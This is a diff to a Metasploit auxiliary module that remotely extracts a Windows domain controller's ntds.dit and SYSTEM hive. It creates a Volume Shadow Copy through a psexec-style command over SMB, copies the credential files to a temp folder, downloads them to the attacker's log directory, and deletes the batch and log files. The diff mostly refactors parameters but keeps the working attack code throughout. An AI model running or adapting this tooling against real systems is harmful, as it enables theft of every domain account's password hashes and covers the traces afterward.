@@ -39,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
 			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store the ntds.dit and SYSTEM hive', '/tmp/NTDS_Grab']),
-			OptInt.new('RPORT', [true, 'The target port', 445]),
+			#OptInt.new('RPORT', [true, 'The target port', 445]),
 			OptString.new('VSCPATH', [false, 'The path to the target Volume Shadow Copy', '']),
 			OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', '\WINDOWS\\']),
 		], self.class)
@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This is the main control method
 	def run_host(ip)
-		text = datastore['WINPATH'] + 'Temp\\' + "#{Rex::Text.rand_text_alpha(16)}.txt"
+		text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
 		bat = "%WINDIR%\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
 		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
 		logdir = datastore['LOGDIR']
@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			if datastore['VSCPATH'].length > 0
 				print_status("#{peer} - Attempting to grab NTDS.dit from #{datastore['VSCPATH']}")
-				n = copy_ntds(smbshare, ip, datastore['VSCPATH'])
+				n = copy_ntds(ip, datastore['VSCPATH'])
 				s = copy_sys_hive(smbshare, ip)
 				if n && s
 					download_ntds(smbshare, (datastore['WINPATH'] + "Temp\\ntds"), ip, logdir)
@@ -83,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 			else
 				if vscpath = check_vss(smbshare, ip, text, bat)
 					#Check if VSC Already exists
-					n = copy_ntds(smbshare, ip, vscpath)
+					n = copy_ntds(ip, vscpath)
 					s = copy_sys_hive(smbshare, ip)
 					if n && s
 						# If the above succeeds then we just have to download our files
@@ -92,9 +92,9 @@ class Metasploit3 < Msf::Auxiliary
 					end
 				else
 					# If VSC doesn't exists already then we see if we can create a new VSC
-					if vscpath = make_volume_shadow_copy(smbshare, ip, createvsc, text, bat)
+					if vscpath = make_volume_shadow_copy(ip, createvsc, text, bat)
 						# If we are successul, try and copy NTDS.dit and SYSTEM hive files
-						n = copy_ntds(smbshare, ip, vscpath)
+						n = copy_ntds(ip, vscpath)
 						s = copy_sys_hive(smbshare, ip)
 						if n && s
 							# If the above succeeds then we just have to download our files
@@ -144,13 +144,12 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Create a Volume Shadow Copy on the target host
-	def make_volume_shadow_copy(smbshare, ip, createvsc, text, bat)
+	def make_volume_shadow_copy(ip, createvsc, text, bat)
 		begin
 			#Try to create the shadow copy
 			command = "%COMSPEC% /C echo #{createvsc} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
-			simple.connect(smbshare)
 			print_status("Creating Volume Shadow Copy")
-			psexec(smbshare, command)
+			out = psexec(command)
 			#Get path to Volume Shadow Copy
 			vscpath = get_vscpath(ip, text)
 		rescue StandardError => vscerror
@@ -160,8 +159,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			cleanup = "%COMSPEC% /C del /F /Q %SYSTEMDRIVE%#{text} & del /F /Q #{bat}"
 			# Run cleanup command
-			simple.connect(smbshare)
-			psexec(smbshare, cleanup)
+			out = psexec(cleanup)
 		rescue StandardError => cleanuperror
 			print_error("Cleanup Command failed: #{cleanuperror}")
 			return nil
@@ -173,7 +171,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
-	def copy_ntds(smbshare, ip, vscpath)
+	def copy_ntds(ip, vscpath)
 		print_status("Copying ntds.dit to Windows Temp directory")
 		begin
 			# Try to copy ntds.dit from VSC
@@ -291,7 +289,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-		def psexec(command)
+	def psexec(command)
 
 		simple.connect("IPC$")
 
